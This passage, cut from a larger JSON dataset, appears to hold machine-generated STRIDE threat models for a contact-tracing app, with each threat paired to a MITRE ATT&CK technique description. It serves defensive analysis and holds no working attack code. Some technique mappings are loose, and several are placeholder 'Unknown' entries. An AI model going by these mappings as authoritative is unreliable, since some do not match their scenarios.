            "Scenario": "In the decentralized architecture, an attacker modifies the app to gain root privileges on the device and access stored keys and contact logs.",
            "Assumptions": [
                {
                    "Assumption": "The mobile app can be tampered with to escalate privileges.",
                    "Role": "System Architect",
                    "Condition": "Lack of app integrity checks."
                },
                {
                    "Assumption": "Attacker can root/jailbreak the device without detection.",
                    "Role": "Attacker",
                    "Condition": "The device's security measures are inadequate."
                }
            ],
            "Potential Impact": "Access to sensitive data stored locally, compromising user privacy.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "root access",
                "decentralized",
                "local data"
            ],
            "mitre_technique": {
                "name": "Code Signing",
                "description": "Code signing provides a level of authenticity on a binary from the developer and a guarantee that the binary has not been tampered with. (Citation: Wikipedia Code Signing) However, adversaries are known to use code signing certificates to masquerade malware and tools as legitimate binaries (Citation: Janicab). The certificates used during an operation may be created, forged, or stolen by the adversary. (Citation: Securelist Digital Certificates) (Citation: Symantec Digital Certificates)\n\nCode signing to verify software on first run can be used on modern Windows and macOS/OS X systems. It is not used on Linux due to the decentralized nature of the platform. (Citation: Wikipedia Code Signing)\n\nCode signing certificates may be used to bypass security policies that require signed code to execute on a system.",
                "id": "attack-pattern--1b84d551-6de8-4b96-9930-d177677c3b1d",
                "technique_id": "T1116"
            }
        }
    ]
},
{
    "case_number": "10",
    "batch_number": "1",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "Adversary impersonates a legitimate user on the centralized server, submitting false COVID-19 positive results.",
            "Assumptions": [
                {
                    "Assumption": "Adversary has access to the user's credentials or can bypass authentication mechanisms.",
                    "Role": "Attacker",
                    "Condition": "Credentials are compromised or weak authentication is used."
                },
                {
                    "Assumption": "The central server does not have robust auditing and validation processes for submitted data.",
                    "Role": "System",
                    "Condition": "Failure in implementing data verification protocols."
                }
            ],
            "Potential Impact": "False exposure notifications, data integrity compromised, disruption of public health response.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "credential access",
                "impersonation",
                "central server"
            ],
            "mitre_technique": {
                "name": "Use Alternate Authentication Material",
                "description": "Adversaries may use alternate authentication material, such as password hashes, Kerberos tickets, and application access tokens, in order to move laterally within an environment and bypass normal system access controls. \n\nAuthentication processes generally require a valid identity (e.g., username) along with one or more authentication factors (e.g., password, pin, physical smart card, token generator, etc.). Alternate authentication material is legitimately generated by systems after a user or application successfully authenticates by providing a valid identity and the required authentication factor(s). Alternate authentication material may also be generated during the identity creation process.(Citation: NIST Authentication)(Citation: NIST MFA)\n\nCaching alternate authentication material allows the system to verify an identity has successfully authenticated without asking the user to reenter authentication factor(s). Because the alternate authentication must be maintained by the system\u2014either in memory or on disk\u2014it may be at risk of being stolen through [Credential Access](https://attack.mitre.org/tactics/TA0006) techniques. By stealing alternate authentication material, adversaries are able to bypass system access controls and authenticate to systems without knowing the plaintext password or any additional authentication factors.\n",
                "id": "attack-pattern--51a14c76-dd3b-440b-9c20-2bf91d25a814",
                "technique_id": "T1550"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "Adversary masquerades as a legitimate Bluetooth device to collect interaction histories.",
            "Assumptions": [
                {
                    "Assumption": "The adversary has technical know-how to replicate Bluetooth devices.",
                    "Role": "Attacker",
                    "Condition": "Typical Bluetooth security protocols are insufficient or bypassed."
                },
                {
                    "Assumption": "The mobile application does not sufficiently verify device identities.",
                    "Role": "System",
                    "Condition": "Failure to use strong mutual authentication."
                }
            ],
            "Potential Impact": "Unauthorized data collection, privacy breach, user trust degradation.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "Bluetooth",
                "device impersonation",
                "unauthorized access"
            ],
            "mitre_technique": {
                "name": "Exfiltration Over Bluetooth",
                "description": "Adversaries may attempt to exfiltrate data over Bluetooth rather than the command and control channel. If the command and control network is a wired Internet connection, an adversary may opt to exfiltrate data using a Bluetooth communication channel.\n\nAdversaries may choose to do this if they have sufficient access and proximity. Bluetooth connections might not be secured or defended as well as the primary Internet-connected channel because it is not routed through the same enterprise network.",
                "id": "attack-pattern--613d08bc-e8f4-4791-80b0-c8b974340dfd",
                "technique_id": "T1011.001"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "Adversary creates a fake application that poses as the legitimate contact tracing app and captures user data.",
            "Assumptions": [
                {
                    "Assumption": "Users download and install applications from untrusted sources.",
                    "Role": "User",
                    "Condition": "Lack of proper user education and awareness."
                },
                {
                    "Assumption": "Fake app successfully bypasses app store security checks.",
                    "Role": "Attacker",
                    "Condition": "App store review process is flawed or bypassed."
                }
            ],
            "Potential Impact": "Exposure of sensitive data, identity theft, privacy invasion.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "fake application",
                "data theft",
                "privacy breach"
            ],
            "mitre_technique": {
                "name": "User Execution",
                "description": "An adversary may rely upon specific actions by a user in order to gain execution. Users may be subjected to social engineering to get them to execute malicious code by, for example, opening a malicious document file or link. These user actions will typically be observed as follow-on behavior from forms of [Phishing](https://attack.mitre.org/techniques/T1566).\n\nWhile [User Execution](https://attack.mitre.org/techniques/T1204) frequently occurs shortly after Initial Access it may occur at other phases of an intrusion, such as when an adversary places a file in a shared directory or on a user's desktop hoping that a user will click on it. This activity may also be seen shortly after [Internal Spearphishing](https://attack.mitre.org/techniques/T1534).\n\nAdversaries may also deceive users into performing actions such as enabling [Remote Access Software](https://attack.mitre.org/techniques/T1219), allowing direct control of the system to the adversary; running malicious JavaScript in their browser, allowing adversaries to [Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)s; or downloading and executing malware for [User Execution](https://attack.mitre.org/techniques/T1204).(Citation: Talos Roblox Scam 2023)(Citation: Krebs Discord Bookmarks 2023)\n\nFor example, tech support scams can be facilitated through [Phishing](https://attack.mitre.org/techniques/T1566), vishing, or various forms of user interaction. Adversaries can use a combination of these methods, such as spoofing and promoting toll-free numbers or call centers that are used to direct victims to malicious websites, to deliver and execute payloads containing malware or [Remote Access Software](https://attack.mitre.org/techniques/T1219).(Citation: Telephone Attack Delivery)",
                "id": "attack-pattern--8c32eb4d-805f-4fc5-bf60-c4d476c131b5",
                "technique_id": "T1204"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "Adversary modifies the mobile application to alter the way proximity data is recorded.",
            "Assumptions": [
                {
                    "Assumption": "Access to the application's source code or a decompiled version.",
                    "Role": "Attacker",
                    "Condition": "Insufficient code obfuscation or security."
                },
                {
                    "Assumption": "Users can be tricked into installing modified versions of the app.",
                    "Role": "User",
                    "Condition": "Inadequate app distribution security."
                }
            ],
            "Potential Impact": "Data integrity compromised, inaccurate exposure logs, undermined public health efforts.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "mobile application",
                "data integrity",
                "source code alteration"
            ],
            "mitre_technique": {
                "name": "Disable or Modify Tools",
                "description": "Adversaries may modify and/or disable security tools to avoid possible detection of their malware/tools and activities. This may take many forms, such as killing security software processes or services, modifying / deleting Registry keys or configuration files so that tools do not operate properly, or other methods to interfere with security tools scanning or reporting information. Adversaries may also disable updates to prevent the latest security patches from reaching tools on victim systems.(Citation: SCADAfence_ransomware)\n\nAdversaries may also tamper with artifacts deployed and utilized by security tools. Security tools may make dynamic changes to system components in order to maintain visibility into specific events. For example, security products may load their own modules and/or modify those loaded by processes to facilitate data collection. Similar to [Indicator Blocking](https://attack.mitre.org/techniques/T1562/006), adversaries may unhook or otherwise modify these features added by tools (especially those that exist in userland or are otherwise potentially accessible to adversaries) to avoid detection.(Citation: OutFlank System Calls)(Citation: MDSec System Calls) \n\nAdversaries may also focus on specific applications such as Sysmon. For example, the \u201cStart\u201d and \u201cEnable\u201d values in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Microsoft-Windows-Sysmon-Operational</code> may be modified to tamper with and potentially disable Sysmon logging.(Citation: disable_win_evt_logging) \n\nOn network devices, adversaries may attempt to skip digital signature verification checks by altering startup configuration files and effectively disabling firmware verification that typically occurs at boot.(Citation: Fortinet Zero-Day and Custom Malware Used by Suspected Chinese Actor in Espionage Operation)(Citation: Analysis of FG-IR-22-369)\n\nIn cloud environments, tools disabled by adversaries may include cloud monitoring agents that report back to services such as AWS CloudWatch or Google Cloud Monitor.\n\nFurthermore, although defensive tools may have anti-tampering mechanisms, adversaries may abuse tools such as legitimate rootkit removal kits to impair and/or disable these tools.(Citation: chasing_avaddon_ransomware)(Citation: dharma_ransomware)(Citation: demystifying_ryuk)(Citation: doppelpaymer_crowdstrike) For example, adversaries have used tools such as GMER to find and shut down hidden processes and antivirus software on infected systems.(Citation: demystifying_ryuk)\n\nAdditionally, adversaries may exploit legitimate drivers from anti-virus software to gain access to kernel space (i.e. [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068)), which may lead to bypassing anti-tampering features.(Citation: avoslocker_ransomware)",
                "id": "attack-pattern--ac08589e-ee59-4935-8667-d845e38fe579",
                "technique_id": "T1562.001"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "Malicious insider alters log files on the centralized server to erase interaction histories.",
            "Assumptions": [
                {
                    "Assumption": "Internal threat actors have sufficient access privileges.",
                    "Role": "Malicious Insider",
                    "Condition": "Weak access control and monitoring."
                },
                {
                    "Assumption": "Lack of proper oversight and auditing mechanisms on critical logs.",
                    "Role": "System",
                    "Condition": "Insufficient logging and monitoring practices."
                }
            ],
            "Potential Impact": "Loss of critical tracking data, compromised tracing accuracy, disrupted exposure notification process.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "log files",
                "centralized server",
                "data modification"
            ],
            "mitre_technique": {
                "name": "Disable or Modify Cloud Logs",
                "description": "An adversary may disable or modify cloud logging capabilities and integrations to limit what data is collected on their activities and avoid detection. Cloud environments allow for collection and analysis of audit and application logs that provide insight into what activities a user does within the environment. If an adversary has sufficient permissions, they can disable or modify logging to avoid detection of their activities.\n\nFor example, in AWS an adversary may disable CloudWatch/CloudTrail integrations prior to conducting further malicious activity.(Citation: Following the CloudTrail: Generating strong AWS security signals with Sumo Logic) They may alternatively tamper with logging functionality \u2013 for example, by removing any associated SNS topics, disabling multi-region logging, or disabling settings that validate and/or encrypt log files.(Citation: AWS Update Trail)(Citation: Pacu Detection Disruption Module) In Office 365, an adversary may disable logging on mail collection activities for specific users by using the `Set-MailboxAuditBypassAssociation` cmdlet, by disabling M365 Advanced Auditing for the user, or by downgrading the user\u2019s license from an Enterprise E5 to an Enterprise E3 license.(Citation: Dark Reading Microsoft 365 Attacks 2021)",
                "id": "attack-pattern--cacc40da-4c9e-462c-80d5-fd70a178b12d",
                "technique_id": "T1562.008"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "Adversary intercepts and alters data in transit between user devices and the central server or other devices.",
            "Assumptions": [
                {
                    "Assumption": "Use of insecure communication channels between devices.",
                    "Role": "System",
                    "Condition": "Failure in implementing end-to-end encryption."
                },
                {
                    "Assumption": "Adversary has the ability to perform MITM (Man-In-The-Middle) attacks.",
                    "Role": "Attacker",
                    "Condition": "Weak network security measures in place."
                }
            ],
            "Potential Impact": "Compromised data integrity, incorrect exposure notifications, undermined user trust.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "data in transit",
                "MITM",
                "communication security"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "User denies having received an exposure notification, claiming system error.",
            "Assumptions": [
                {
                    "Assumption": "Lack of proper evidence preservation and logging mechanisms.",
                    "Role": "System",
                    "Condition": "Insufficient logging of notification delivery events."
                },
                {
                    "Assumption": "Centralized server does not enforce non-repudiation mechanisms.",
                    "Role": "System",
                    "Condition": "No cryptographic proof or timestamps for notifications."
                }
            ],
            "Potential Impact": "Disputed exposure notifications, potential legal implications, reduced system reliability.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "non-repudiation",
                "notification delivery",
                "log integrity"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "Malicious user denies uploading rolling keys after testing positive.",
            "Assumptions": [
                {
                    "Assumption": "System lacks processes to confirm and track critical user actions.",
                    "Role": "System",
                    "Condition": "Absence of confirmation logging and user actions tracking."
                },
                {
                    "Assumption": "No mechanisms in place to verify the successful upload of keys.",
                    "Role": "System",
                    "Condition": "Weak feedback loops in the key upload process."
                }
            ],
            "Potential Impact": "Failed contact tracing efforts, inaccurate exposure results, public health threats not fully tracked.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "rolling keys",
                "key upload",
                "user actions verification"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "Healthcare providers or intermediaries deny their involvement in data alteration.",
            "Assumptions": [
                {
                    "Assumption": "Intermediaries have the capability to alter data before reporting.",
                    "Role": "Actor",
                    "Condition": "Existence of weak auditing through the chain of custody."
                },
                {
                    "Assumption": "No digital signature mechanisms implemented for data integrity.",
                    "Role": "System",
                    "Condition": "Lacking cryptographic guarantees on data integrity."
                }
            ],
            "Potential Impact": "Data tampering without trace, undermining trust in the system, compromised public health response.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "data alteration",
                "chain of custody",
                "data integrity"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Accidental exposure of sensitive health data through debugging logs left in production.",
            "Assumptions": [
                {
                    "Assumption": "Debugging logs contain sensitive information.",
                    "Role": "Developer",
                    "Condition": "Failure in sanitizing log files before production release."
                },
                {
                    "Assumption": "Insufficient monitoring and alerting on log access and exposure.",
                    "Role": "System",
                    "Condition": "Lack of vigilance in log management practices."
                }
            ],
            "Potential Impact": "Loss of data confidentiality, potential legal consequences, user privacy violation.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "debugging logs",
                "sensitive health data",
                "log management"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Adversary gains unauthorized access to centralized server database containing sensitive information.",
            "Assumptions": [
                {
                    "Assumption": "Weak access control mechanisms on the centralized server.",
                    "Role": "System",
                    "Condition": "Insufficient privileges and role management."
                },
                {
                    "Assumption": "Database encryption either not implemented or poorly configured.",
                    "Role": "System",
                    "Condition": "Weak or non-existent encryption practices."
                }
            ],
            "Potential Impact": "Confidential data breach, privacy implications for users, potential for extensive misuse.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "database access",
                "centralized server",
                "sensitive information"
            ],
            "mitre_technique": {
                "name": "Exfiltration Over Alternative Protocol",
                "description": "Adversaries may steal data by exfiltrating it over a different protocol than that of the existing command and control channel. The data may also be sent to an alternate network location from the main command and control server.  \n\nAlternate protocols include FTP, SMTP, HTTP/S, DNS, SMB, or any other network protocol not being used as the main command and control channel. Adversaries may also opt to encrypt and/or obfuscate these alternate channels. \n\n[Exfiltration Over Alternative Protocol](https://attack.mitre.org/techniques/T1048) can be done using various common operating system utilities such as [Net](https://attack.mitre.org/software/S0039)/SMB or FTP.(Citation: Palo Alto OilRig Oct 2016) On macOS and Linux <code>curl</code> may be used to invoke protocols such as HTTP/S or FTP/S to exfiltrate data from a system.(Citation: 20 macOS Common Tools and Techniques)\n\nMany IaaS and SaaS platforms (such as Microsoft Exchange, Microsoft SharePoint, GitHub, and AWS S3) support the direct download of files, emails, source code, and other sensitive information via the web console or [Cloud API](https://attack.mitre.org/techniques/T1059/009).",
                "id": "attack-pattern--a19e86f8-1c0a-4fea-8407-23b73d615776",
                "technique_id": "T1048"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Eavesdropping on Bluetooth communication to uncover user interaction histories.",
            "Assumptions": [
                {
                    "Assumption": "Bluetooth communication is not adequately secured.",
                    "Role": "System",
                    "Condition": "Lack of encryption or weak encryption protocols."
                },
                {
                    "Assumption": "Adversary has physical proximity to conduct Bluetooth interception.",
                    "Role": "Attacker",
                    "Condition": "Ability to be near target devices."
                }
            ],
            "Potential Impact": "Privacy invasion, unauthorized collection of interaction data, potential exposure to targeted attacks.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "eavesdropping",
                "Bluetooth communication",
                "user interaction"
            ],
            "mitre_technique": {
                "name": "Exfiltration Over Bluetooth",
                "description": "Adversaries may attempt to exfiltrate data over Bluetooth rather than the command and control channel. If the command and control network is a wired Internet connection, an adversary may opt to exfiltrate data using a Bluetooth communication channel.\n\nAdversaries may choose to do this if they have sufficient access and proximity. Bluetooth connections might not be secured or defended as well as the primary Internet-connected channel because it is not routed through the same enterprise network.",
                "id": "attack-pattern--613d08bc-e8f4-4791-80b0-c8b974340dfd",
                "technique_id": "T1011.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "DDoS attack on the central or service server disrupts data processing and notification services.",
            "Assumptions": [
                {
                    "Assumption": "Servers have inadequate protection against high traffic volumes.",
                    "Role": "System",
                    "Condition": "Lack of DDoS mitigation strategies."
                },
                {
                    "Assumption": "Adversary is capable of orchestrating a significant volume of traffic.",
                    "Role": "Attacker",
                    "Condition": "Existence of sufficient botnet or resources."
                }
            ],
            "Potential Impact": "Service unavailability, interrupted exposure notifications, impaired public health response.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "DDoS",
                "server disruption",
                "service availability"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Exploitation of a vulnerability in the mobile application to crash the app on user devices.",
            "Assumptions": [
                {
                    "Assumption": "The existence of unpatched or zero-day vulnerabilities.",
                    "Role": "System",
                    "Condition": "Slow patching cadence or incomplete vulnerability management."
                },
                {
                    "Assumption": "Adversary is aware of and can exploit this specific vulnerability.",
                    "Role": "Attacker",
                    "Condition": "Public or private knowledge of vulnerabilities."
                }
            ],
            "Potential Impact": "Application crashes, loss of tracking functionality, reduced effectiveness of contact tracing.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "vulnerability exploitation",
                "mobile application",
                "app crash"
            ],
            "mitre_technique": {
                "name": "Application or System Exploitation",
                "description": "Adversaries may exploit software vulnerabilities that can cause an application or system to crash and deny availability to users. (Citation: Sucuri BIND9 August 2015) Some systems may automatically restart critical applications and services when crashes occur, but they can likely be re-exploited to cause a persistent denial of service (DoS) condition.\n\nAdversaries may exploit known or zero-day vulnerabilities to crash applications and/or systems, which may also lead to dependent applications and/or systems to be in a DoS condition. Crashed or restarted applications or systems may also have other effects such as [Data Destruction](https://attack.mitre.org/techniques/T1485), [Firmware Corruption](https://attack.mitre.org/techniques/T1495), [Service Stop](https://attack.mitre.org/techniques/T1489) etc. which may further cause a DoS condition and deny availability to critical information, applications and/or systems. ",
                "id": "attack-pattern--2bee5ffb-7a7a-4119-b1f2-158151b19ac0",
                "technique_id": "T1499.004"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Adversary floods the network with malformed Bluetooth packets, disrupting device communication.",
            "Assumptions": [
                {
                    "Assumption": "Bluetooth stack implementations in devices are vulnerable to packet flooding.",
                    "Role": "System",
                    "Condition": "Poor Bluetooth protocol handling."
                },
                {
                    "Assumption": "Adversary is in physical proximity to carry out the attack.",
                    "Role": "Attacker",
                    "Condition": "Ability to target within Bluetooth range."
                }
            ],
            "Potential Impact": "Loss of device communication, impaired proximity detection, disrupted logging and notifications.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "Bluetooth flooding",
                "network disruption",
                "communication interference"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Adversary exploits a system vulnerability to gain administrator privileges on the centralized server.",
            "Assumptions": [
                {
                    "Assumption": "Existing vulnerabilities in the server software or configuration.",
                    "Role": "System",
                    "Condition": "Unpatched software or insecure configurations."
                },
                {
                    "Assumption": "Adversary has the capability to find and exploit these vulnerabilities.",
                    "Role": "Attacker",
                    "Condition": "Technical skill and resources available."
                }
            ],
            "Potential Impact": "Full control over the system, unauthorized data manipulation, widespread potential for additional attacks.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "administrator access",
                "centralized server",
                "vulnerability exploitation"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Malicious application gains higher permissions on user devices through exploitation of OS vulnerabilities.",
            "Assumptions": [
                {
                    "Assumption": "Unknown or unpatched OS vulnerabilities exist.",
                    "Role": "System",
                    "Condition": "Slow update cycle or unaddressed vulnerabilities."
                },
                {
                    "Assumption": "Application requests and gains inappropriate permissions during installation.",
                    "Role": "Attacker",
                    "Condition": "Users accept permission requests without scrutiny."
                }
            ],
            "Potential Impact": "Increased application control, data theft, unauthorized actions on device.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "mobile device",
                "OS vulnerability",
                "permissions exploitation"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Adversary injects malicious code into the application to escalate privileges and access sensitive data.",
            "Assumptions": [
                {
                    "Assumption": "Application has exploitable code injection vulnerabilities.",
                    "Role": "System",
                    "Condition": "Presence of insecure code practices or insufficient code review."
                },
                {
                    "Assumption": "Adversary has knowledge of and can exploit code vulnerabilities.",
                    "Role": "Attacker",
                    "Condition": "Access and skill to manipulate code injection points."
                }
            ],
            "Potential Impact": "Unauthorized data access and control, privacy breaches, data integrity compromised.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "code injection",
                "application security",
                "sensitive data access"
            ],
            "mitre_technique": {
                "name": "Dynamic-link Library Injection",
                "description": "Adversaries may inject dynamic-link libraries (DLLs) into processes in order to evade process-based defenses as well as possibly elevate privileges. DLL injection is a method of executing arbitrary code in the address space of a separate live process.  \n\nDLL injection is commonly performed by writing the path to a DLL in the virtual address space of the target process before loading the DLL by invoking a new thread. The write can be performed with native Windows API calls such as <code>VirtualAllocEx</code> and <code>WriteProcessMemory</code>, then invoked with <code>CreateRemoteThread</code> (which calls the <code>LoadLibrary</code> API responsible for loading the DLL). (Citation: Elastic Process Injection July 2017) \n\nVariations of this method such as reflective DLL injection (writing a self-mapping DLL into a process) and memory module (map DLL when writing into process) overcome the address relocation issue as well as the additional APIs to invoke execution (since these methods load and execute the files in memory by manually preforming the function of <code>LoadLibrary</code>).(Citation: Elastic HuntingNMemory June 2017)(Citation: Elastic Process Injection July 2017) \n\nAnother variation of this method, often referred to as Module Stomping/Overloading or DLL Hollowing, may be leveraged to conceal injected code within a process. This method involves loading a legitimate DLL into a remote process then manually overwriting the module's <code>AddressOfEntryPoint</code> before starting a new thread in the target process.(Citation: Module Stomping for Shellcode Injection) This variation allows attackers to hide malicious injected code by potentially backing its execution with a legitimate DLL file on disk.(Citation: Hiding Malicious Code with Module Stomping) \n\nRunning code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via DLL injection may also evade detection from security products since the execution is masked under a legitimate process. ",
                "id": "attack-pattern--f4599aa0-4f85-4a32-80ea-fc39dc965945",
                "technique_id": "T1055.001"
            }
        }
    ]
},
{
    "case_number": "10",
    "batch_number": "4",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker creates a fake instance of the mobile application to capture credentials and other sensitive data from users.",
            "Assumptions": [
                {
                    "Assumption": "User lacks awareness or education on verifying application authenticity.",
                    "Role": "User",
                    "Condition": "Medium to low technical ability"
                },
                {
                    "Assumption": "The official application distribution channel is compromised or a counterfeit application is spread through alternative means.",
                    "Role": "Attacker",
                    "Condition": "Compromised application store or phishing campaign"
                },
                {
                    "Assumption": "Users routinely input sensitive data like health status and personal identifiers without verifying application authenticity.",
                    "Role": "User",
                    "Condition": "High interaction with the application"
                }
            ],
            "Potential Impact": "Unauthorized disclosure of sensitive information such as health data and personal identifiers.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "credential theft",
                "fake app",
                "user device"
            ],
            "mitre_technique": {
                "name": "Phishing",
                "description": "Adversaries may send phishing messages to gain access to victim systems. All forms of phishing are electronically delivered social engineering. Phishing can be targeted, known as spearphishing. In spearphishing, a specific individual, company, or industry will be targeted by the adversary. More generally, adversaries can conduct non-targeted phishing, such as in mass malware spam campaigns.\n\nAdversaries may send victims emails containing malicious attachments or links, typically to execute malicious code on victim systems. Phishing may also be conducted via third-party services, like social media platforms. Phishing may also involve social engineering techniques, such as posing as a trusted source, as well as evasive techniques such as removing or manipulating emails or metadata/headers from compromised accounts being abused to send messages (e.g., [Email Hiding Rules](https://attack.mitre.org/techniques/T1564/008)).(Citation: Microsoft OAuth Spam 2022)(Citation: Palo Alto Unit 42 VBA Infostealer 2014) Another way to accomplish this is by forging or spoofing(Citation: Proofpoint-spoof) the identity of the sender which can be used to fool both the human recipient as well as automated security tools.(Citation: cyberproof-double-bounce) \n\nVictims may also receive phishing messages that instruct them to call a phone number where they are directed to visit a malicious URL, download malware,(Citation: sygnia Luna Month)(Citation: CISA Remote Monitoring and Management Software) or install adversary-accessible remote management tools onto their computer (i.e., [User Execution](https://attack.mitre.org/techniques/T1204)).(Citation: Unit42 Luna Moth)",
                "id": "attack-pattern--a62a8db3-f23a-4d8f-afd6-9dbc77e7813b",
                "technique_id": "T1566"
            }
        },
